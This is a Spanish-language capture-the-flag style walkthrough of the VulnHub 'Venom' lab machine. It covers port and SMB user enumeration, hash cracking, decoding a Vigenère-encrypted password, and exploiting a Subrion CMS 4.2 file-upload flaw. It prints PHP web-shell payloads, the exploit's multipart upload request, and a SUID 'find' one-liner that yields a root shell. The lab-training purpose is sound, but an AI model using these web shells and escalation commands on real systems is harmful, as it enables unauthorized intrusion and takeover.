---
layout: single
title: Venom - VulnHub
excerpt: " This machine was created for the OSCP Preparation.This box was created with virtualbox. Enumeration is the Key. "
date: 2023-01-30
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-venom/venom.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - ftp
  - hash
  - base64
  - suid
  - php
  - python
---

This machine was created for the OSCP Preparation.This box was created with virtualbox. Enumeration is the Key.

# Summary
- IP: 192.168.1.46
- Ports: 21,80,139,443,445
- OS: Linux (Ubuntu)
- Services & Applications:
	-  21 -> vsftpd 3.0.3
	-  80 -> Apache httpd 2.4.29
	-  139 -> Samba smbd 3.X - 4.X
	-  443 -> Apache httpd 2.4.29
	-  445 -> Samba smbd 4.7.6-Ubuntu
# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.46 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p21,80,139,443,445 -sCV 192.168.1.46 -oN targeted
```

- Análisis de directorios con gobuster:

```bash
$gobuster dir -u 192.168.1.46 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
```

- Analizamos el servicio RPC aprovechando que están abiertos los puertos 139 y 445, tratando de enumerar los usuarios existentes dentro de la máquina:

```bash
$rpcclient -U "" -N 192.168.1.46
```

```
rpcclient $> help
rpcclient $> lookupnames root
rpcclient $> lookupsids S-1-22-2-0
rpcclient $> lookupsids S-1-22-2-1
exit
```

```bash
$seq 1 1500 | xargs -P 50 -I {} rpcclient -U "" -N 192.168.1.46 -c "lookupsids S-1-22-1-{}" | grep -oP '.*User\\[a-z].*\s'
```

- Enumeramos usuarios potenciales: "nathan" y "hostinger".


# Análisis de página web:

- Entrando en la página principal por el puerto 80, vemos la interfaz por defecto de apache, con una variante al pie de página, que revisando el código fuente, podemos encontrar la siguiente linea:

```html
<!...<5f2a66f947fa5690c26506f66bde5c23> follow this to get access on somewhere.....-->
```

- Crackeamos el hash en www.hashes.com y obtenemos una posible credencial: "hostinger".


# Acceso FTP:

- Accedemos via FTP usando alguno de los usuarios que habíamos encontrado y la credencial, funcionando con el usuario "hostinger".

- Enumeramos un directorio "files" el cual contiene un archivo "hint.txt", lo descargamos y lo leemos:

```
T0D0 --

* You need to follow the 'hostinger' on WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= also aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=
* some knowledge of cipher is required to decode the dora password..
* try on venom.box
password -- L7f9l8@J#p%Ue+Q1234 -> deocode this you will get the administrator password 


Have fun .. :)
```


- Vemos dos strings al parecer en base 64, lo decodeamos, el primero nos arroja lo siguente:

```bash
$echo "WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=" | base64 -d | base64 -d | base64 -d

standard vigenere cipher
```

```bash
$echo "aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=" | base64 -d

https://cryptii.com/pipes/vigenere-cipher
```

- Al parecer la contraseña alojada en el archivo "hint.txt" está encriptada usando "standard vigenere cipher", por lo que usaremos cualquier página como la misma que nos proporciona el archivo para poder desencriptarla.

- Este tipo de cifrado nos pide una key, la cual intentamos con la credencial que encontramos anteriormente, obteniendo una posible credencial para el usuario "dora".

- Agregamos la dirección "venom.box" al "/etc/hosts" y accedemos.

- Encontramos un login de "Subrion CMS", accedemos como "dora" usando la contraseña que hemos desencriptado.

- Vemos que sí se pudo acceder y seremos "administrator"; analizamos el código fuente de la página y encontramos la version utilizada del CMS, buscamos vulnerabilidades para "Subrion CMS 4.2"-

```bash
$searchsploit subrion cms 4.2
```

- Encontramos un "arbitrary file upload", que consiste en una exploit escrita en python que nos permite subir archivos de tal forma que podamos inyectar un PHP malicioso.

- Analizamos el código para ver exactamente que es lo que hace por detrás y poder hacerlo de forma manual-

- Vemos en ciertas lineas de código información relevante:

```python
up_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "*/*", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------6159367931540763043609390275", "Origin": "http://192.168.1.20", "Connection": "close", "Referer": "http://192.168.1.20/panel/uploads/"}
```

```python
up_data = "-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n17978446266285\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"__st\"\r\n\r\n"+csrfToken+"\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\""+shell_name+".phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_GET['cmd']); ?>\n\r\n-----------------------------6159367931540763043609390275\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1621210391\r\n-----------------------------6159367931540763043609390275--\r\n"
```

```python
url_clean = url_shell.replace('/panel', '')
        req = session.get(url_clean + shell_name + '.phar?cmd=id')
```

- Accedemos al directorio "/panel/uploads" y efectivamente nos permite la subida de archivos, en cual subiremos un PHP malicioso usando la extensión ".phar":

```
nano cmd.phar
```

```php
<?php echo passthru($_GET["cmd"]); ?>
```

- De acuerdo al código de python, el archivo subido se aloja en el directorio "/uploads/" así que nos dirigimos a dicha dirección y comprobamos que podemos ejecutar comandos mediante el parámetro "cmd":

```
http://venom.box/uploads/cmd.phar?cmd=whoami
```

- Entablamos una reverse shell básica y ganamos acceso al sistema como el usuario "www-data"


# ESCALANDO PRIVILEGIOS:

- Pivotamos al usuario "hostinger" el cual habíamos enumerado anteriormente usando la credencial "hostinger".

- Cateamos el archivo ".bash_history" del usuario "hostinger" y encontramos un directorio el cual contiene un archivo "/var/www/html/subrion/backup/.htaccess"

- Cateamos el archivo ".htaccess" y encontramos una posible credencial, la usamos para pivotar al usuario "nathan"

- Buscamos permisos SUID y vemos lo siguiente:

```bash
find / -perm -4000 2>/dev/null | grep -v snap
```

```
/usr/bin/find
```

- Buscamos en "gtfobins" la manera de escalar privilegios usando el binario "find" con permisos SUID y encontramos el siguiente comando:

```bash
./find . -exec /bin/sh -p \; -quit
```

- Lo ejecutamos y seremos root.
